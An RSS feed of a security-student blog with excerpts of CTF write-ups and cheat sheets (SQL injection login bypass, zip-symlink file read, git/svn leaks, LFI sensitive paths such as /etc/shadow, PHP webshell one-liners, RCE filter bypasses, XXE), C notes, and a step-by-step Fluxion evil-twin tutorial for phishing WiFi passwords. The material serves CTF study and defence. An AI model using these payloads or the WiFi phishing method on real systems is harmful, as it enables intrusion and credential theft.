<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Sc0fie1d-Blog</title>
        <link>http://scofield1920.github.io/</link>
        <description>The official documentation for the Hugo DoIt theme</description>
        <generator>Hugo -- gohugo.io</generator><language>en</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
            <atom:link href="http://scofield1920.github.io/index.xml" rel="self" type="application/rss+xml" />
        <item>
    <title>BUUCTF awdp加固题</title>
    <link>http://scofield1920.github.io/buuctf_reinforce_wp/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/buuctf_reinforce_wp/</guid>
    <description><![CDATA[[Ezsql]1.break首先进入靶机web页面
猜了弱口令都不对，尝试sql万能密码成功登录
1 2 用户名：admin&#39; or 1=1# 密码：(填不填都行，填啥也行) 题目要求对页面存在的sql注入漏洞进行加固，即可取得flag
2.fix根据题目给的地址端口以及用户名，ssh连接至靶机，进入/var/www/html/目录
在此处新建一个phpinfo.php并写入语句
1 &lt;?php phpinfo(); ?&gt; 访问phpinfo.php可以看到当前php版本为7.3.18
php中防止sql注入的函数无非就那么几个：（我所知道的）
addslashes()
mysql_real_escape_string() 在php5.5中已经弃用，并在php7中被删除
mysql_escape_string() PHP 4 &gt;= 4.0.3, PHP 5
在PHP7中，能用的只有addslashes()
故应在index.php中添加以下代码
1 2 $username = addslashes($username); $password = addslashes($password); 添加在此处：
随后进入check服务器/check目录进行check 通过之后访问/flag得到flag字符串
[babypython]1.break进入靶机web页面，是个上传界面，经过尝试后发现只能上传zip文件，猜测是通过上传软链接的压缩包来读取相关信息（压缩一个软链接，类似于windows下的快捷方式，然后网站后台会解压读取该软链接指向的服务器上的文件，就能达到读取任意文件的效果。） 在Linux环境下：
1 2 ln -s /etc/passwd passwd zip -y passwd.zip passwd 生成了一个读取**/etc/passwd的zip软链接 随后上传我们得到的压缩包passwd.zip便可以在web页面看到回显的passwd文件信息
再来读取下app/uwsgi.ini
uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管理及应用监控等功能。它支持WSGI协议，同时它也支持自有的uWSGI协议
读一下**/app/main.py**
最终找到源码文件：/app/y0u_found_it/y0u_found_main.py
1 2 3 4 app.config[‘SECRET_KEY’] = str(random.random()*100) random.seed(uuid.getnode())	设置随机数种子操作。 python random	生成的数是伪随机数 uuid.]]></description>
</item><item>
    <title>ctfhub_信息泄露wp</title>
    <link>http://scofield1920.github.io/ctfhub--info_leakage/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>scofield_lee</name>
    </author><guid>http://scofield1920.github.io/ctfhub--info_leakage/</guid>
    <description><![CDATA[【目录遍历】emm挨着找吧
【PHPINFO】ctrl+f，搜索flag
【备份文件下载】（网站源码） 1 python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件
（vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件
1 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件
使用cat DS_Store命令来查看文件，发现了一个txt文件
把这个文件复制下来添加到地址后得到flag
【Git泄露】（log）利用GitHacker工具
1 githacker --url http://xxxxx/.git/ --output-folder result 然后进入目录进行：
git log
1 git diff 3e25d 或者 git diff HEAD^ （stash） git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 先进行githacker，然后git stash list发现有stash
执行git stash apply或者git stash pop
（index）直接githacker扒目录
【svn泄露】使用dvcs-ripper工具
1 ./rip-svn.pl -u http://challenge-4c86874278e5cd1d.sandbox.ctfhub.com:10800/.svn 然后进入工具目录下的.svn文件夹
1 cat wc.]]></description>
</item><item>
    <title>ctfshow_deserialize</title>
    <link>http://scofield1920.github.io/ctfshow_deserialize/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_deserialize/</guid>
    <description><![CDATA[PHP面向对象编程：
https://www.runoob.com/php./php-oop.html
总结：Lethe&rsquo;s Blog谈一谈PHP反序列化
反序列化中常见的魔术方法：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 __wakeup() //执行unserialize()时，先会调用这个函数 __sleep() //执行serialize()时，先会调用这个函数 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发 __toString() //把类当作字符串使用时触发 __invoke() //当尝试将对象调用为函数时触发 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 靶场题目：[web254] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 &lt;?]]></description>
</item><item>
    <title>ctfshow_file_include</title>
    <link>http://scofield1920.github.io/ctfshow_file_include/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_file_include/</guid>
    <description><![CDATA[总结：文件包含漏洞全面详解
php文件包含函数：
1 2 3 4 require():找不到被包含的文件会产生致命错误，并停止脚本运行 include():找不到被包含的文件只会产生警告，脚本继续执行 require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 本地文件包含漏洞(LFI)常见敏感信息路径:Windows系统:
C:\boot.ini //查看系统版本 C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件 C:\windows\repair\sam //存储Windows系统初次安装的密码 C:\ProgramFiles\mysql\my.ini //Mysql配置 C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码 C:\windows\php.ini //php配置信息 Linux/Unix系统:
/etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。
包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。
利用条件：
对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知
以直接访问的形式来写入如访问127.0.0.1&lt;?php phpinfo();?&gt;在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码
包含Session文件利用条件：
找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径:
/var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径
包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。
由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。
远程文件包含(RFI)PHP的配置选项allow_url_include、allow_url_fopen状态为ON，则include/require函数是可以加载远程文件，在这种情况下可能产生RFI漏洞 可以来远程读取恶意webshell文件 截断方法：%00截断（php&lt;5.3.4）、?截断（?后内容被视作GET传参）
PHP伪协议file://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响
1 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。]]></description>
</item><item>
    <title>ctfshow_file_upload</title>
    <link>http://scofield1920.github.io/ctfshow_file_upload/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_file_upload/</guid>
    <description><![CDATA[总结：CTF中文件上传及文件包含总结
CTF文件上传漏洞总结
文件上传马儿总结：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 短标签马儿： 一般的马儿： &lt;?php eval（$_POST[&#39;cmd&#39;]);?&gt; 没有PHP的马儿 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;? eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;% eval（$_POST[&#39;cmd&#39;]);%&gt; 有PHP的马儿 &lt;script language=&#34;php&#34;&gt;&lt;/script&gt; 特殊马儿： 过滤[]：用{}代替 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; 直接拿flag的变形马儿 &lt;? echo `tac /var/www/html/f*`;?&gt; &lt;?]]></description>
</item><item>
    <title>ctfshow_rce</title>
    <link>http://scofield1920.github.io/ctfshow_rce/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_rce/</guid>
    <description><![CDATA[总结：文件读取可代替命令 1 2 3 4 5 6 7 8 9 10 11 12 13 more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 rev:逆序查看 以及：
1 2 3 4 5 curl file:///flag strings /flag uniq -c/etc/passwd bash -v /etc/passwd rev /etc/passwd 空格绕过 1 2 3 4 5 6 7 8 &lt; &lt;&gt;	//重定向符 %20	//(space) %09	//(tab) $IFS$9 ${IFS}	//最好用这个 $IFS {cat,flag.]]></description>
</item><item>
    <title>ctfshow_xxe</title>
    <link>http://scofield1920.github.io/ctfshow_xxe/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/ctfshow_xxe/</guid>
    <description><![CDATA[总结xml基础XML是一种用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
xml文档结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 &lt;!--XML申明--&gt; &lt;?xml version=&#34;1.0&#34;?&gt; &lt;!--文档类型定义--&gt; &lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt; ]]]&gt; &lt;!--文档元素--&gt; &lt;note&gt; &lt;to&gt;Dave&lt;/to&gt; &lt;from&gt;Tom&lt;/from&gt; &lt;head&gt;Reminder&lt;/head&gt; &lt;body&gt;You are a good man&lt;/body&gt; &lt;/note&gt; DTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可
被成行地声明于XML文档中（内部引用），也可作为一个外部引用。内部声明DTD:
1 &lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD:]]></description>
</item><item>
    <title>C语言笔记</title>
    <link>http://scofield1920.github.io/c_language_notes/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>scofield_lee</name>
    </author><guid>http://scofield1920.github.io/c_language_notes/</guid>
    <description><![CDATA[C语言一刷的时候是没有笔记的，开刷Python之后才开始整理笔记，今天开始C语言二刷，顺便做做题，笔记的框架是根据浙大翁凯教授的慕课构建的，随后又根据学校的考试内容进行了整体补充插入，可能会出现小部分内容重复，也可能会存在插入知识点跟前后关联性较小等问题，同时也插入了学校教材中的习题 1.1解释型语言&amp;编译型语言 有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序（Windows 下的 .exe），比如C语言、C++、Golang、Pascal（Delphi）、汇编等，这种编程语言称为编译型语言，使用的转换工具称为编译器。(编译型) 有的编程语言可以一边执行一边转换，需要哪些源代码就转换哪些源代码，不会生成可执行程序，比如 Python、JavaScript、PHP、Shell、MATLAB 等，这种编程语言称为解释型语言，使用的转换工具称为解释器。(解释型) 2.1计算printf(&ldquo;xx&rdquo;); 打印xx
scanf(&quot;%d&quot;,&amp;price); 将读取到的整数赋值给price
const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量
1 const int AMOUNT = 100 常量变量名常用全大写
浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数)
当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算
double双精度浮点数，还有float表示单精度浮点数
改进后的例子：
身高单位换算 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include&lt;stdio.h&gt; int main() { printf(&#34;请分别输入身高的英尺和英寸，&#34; 如输入\&#34;5 7\&#34;表示5英尺7英寸：”)； double foot; double inch; scanf(&#34;%lf %lf&#34;,&amp;foot,&amp;inch); print(&#34;身高是%f米。\n&#34;,((foot + inch /12)* 0.3048)); return 0; } 2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值
运算符operator，是指进行运算的动作，比如加法运算符“+”。
算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值
计算时间差 1 2 3 4 5 6 7 8 9 10 11 #include &lt;stdio.]]></description>
</item><item>
    <title>fluxion---新时代破解WiFi的瑞士军刀</title>
    <link>http://scofield1920.github.io/fluxion/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>scofield_lee</name>
    </author><guid>http://scofield1920.github.io/fluxion/</guid>
    <description><![CDATA[**首先声明：**工具经过我多次实测过，验证了很多网传的教程，大多数是正确的，但也有些不是很合理的指导步骤，或者说是文章作者不加验证和修改地抄别人文章。确实，在这个圈子里很多技术帖都是传来传去，抄来抄去，但我觉得，抄文章应在学习的同时加以验证和修改一些前人不妥的地方，由于时间和个人水平的限制，本文章有些截图和内容来源于他人文章，所以会造成前后图片中SSID不一致的情况，但并不影响阅读和实践。
私自破解他人 WiFi 属于违法行为，我这里使用的是自己买的 迷你版路由器 作为学习和测试。明白了破解原理就知道应该怎么防范了。
0x1-Fluxion是什么Fluxion是一个无线破解工具，这款软件可以帮你挤掉WiFi主人的网络让你自己登陆进去，而且WiFi主人怎么挤也挤不过你。
0x2-Fluxion工作原理　1.扫描能够接收到的WIFI信号
2.抓取握手包(这一步的目的是为了验证WiFi密码是否正确)
3.使用WEB接口
4.启动一个假的AP实例来模拟原本的接入点
5.然后会生成一个MDK3进程。如果普通用户已经连接到这个WiFi，也会输入WiFi密码
6.随后启动一个模拟的DNS服务器并且抓取所有的DNS请求，并且会把这些请求重新定向到一个含有恶意脚本的HOST地址
7.随后会弹出一个窗口提示用户输入正确的WiFi密码
8.用户输入的密码将和第二步抓到的握手包做比较来核实密码是否正确
0x3-Fluxion的安装在终端输入以下命令安装fluxion：
1 git clone https://github.com/deltaxflux/fluxion.git 随后通过终端进入到fluxion目录
Tips：不同版本的kali情况可能不同，但首次需要使用通过./fluxion.sh -i 来安装kali缺少的工具
0x4-Fluxion的使用 1 2 cd fluxion ./fluxion.sh 在语言选择界面直接选中文就好了，6.9版本的选18，注意不要输入018
接下来进入主界面：
首先我们选择2，先扫描并抓取WiFi信息，虽然网上有些教程说是先选1，但其实并不正确。
可以看到左边终端窗口显示扫描到的一些热点，当目标信号出现后，可按ctl+c返回原界面，当然也可以按两次q键。
输入编号选中要攻击的信号节点
输入2跳过
选择2，因为之前有攻击过一次，抓到了握手包
选择2
选择2
选择1
选择2
开始抓去握手包…
出现如图所示，则抓包成功，这个包是后续用来检测密码的。当然也可对其进行其他的一些研究和操作，接着选择1，启动攻击
接着回到刚开始的界面，这里我们要选择1，因为我们已经抓到包了
这里继续选择2，选择1，后面的钓鱼热点就开不开了
这里选择2
选择1的话网上说所有人都会连不上，我试过了，确实是这样的
选择推荐的1，开始建立AP
选择1
选择1，这个抓取到的hash文件就是我们刚才抓到的包
选择推荐的2
选择1
选择推荐的1
这个工具的工作原理是，把原来的WiFi打掉，然后建立一个同名热点，你连接上这个热点后，他会弹出你选择的认证界面，提示你重新输入密码，你输入的密码他会去根据抓到的包进行验证，密码正确就保存密码，关闭钓鱼热点，密码错误就继续让你输入。
下面还有很多界面种类，这里选3中文认证界面，这个界面是可以自己建立的钓鱼WiFi的认证界面，但是我不会，应该是用一个什么软件建立了一个界面，然后在特定的文件夹里添加上，如果不会建立界面，就用它自带的即可。 选择后开始建立钓鱼热点，出现六个小窗口，原来的WiFi就连接不上了，我们的钓鱼WiFi出现了，当连接同名钓鱼WiFi时就会弹出认证窗口。 注意，这时候所选择的设备是早已经连上目标WiFi的，我是用自己手机连着实验室的bamboo的。
可以看到，我手机上提示了密码错误，以及出现了两个bamboo。
真正的WiFi会一直无法连接，同时会有一个一模一样未加密的伪AP，手机连上伪AP，输入密码后正确密码保存在netlog文件夹中，错误密码保存在pwdlog文件夹中
以下是手机连上伪AP后弹出的认证界面，可以看到它要求你输入密码，输入正确密码后会告诉你自动修复。
出现了钓鱼界面，而刚才说的可以自己制作的钓鱼界面就是这个，可以自己根据社工出的路由器牌子制作相应逼真的网站提高钓鱼成功率。 如果成功的话4个窗口会消失，如下图
2退出
最终结果：
文件打开后可以看到Password后就是bamboo的密码 另外错误密码的文件夹也能查看]]></description>
</item><item>
    <title>Hello World</title>
    <link>http://scofield1920.github.io/hello-world/</link>
    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
        <name>Author</name>
    </author><guid>http://scofield1920.github.io/hello-world/</guid>
    <description><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
Quick StartCreate a new post 1 $ hexo new &#34;My New Post&#34; More info: Writing
Run server 1 $ hexo server More info: Server
Generate static files 1 $ hexo generate More info: Generating]]></description>
</item></channel>
</rss>
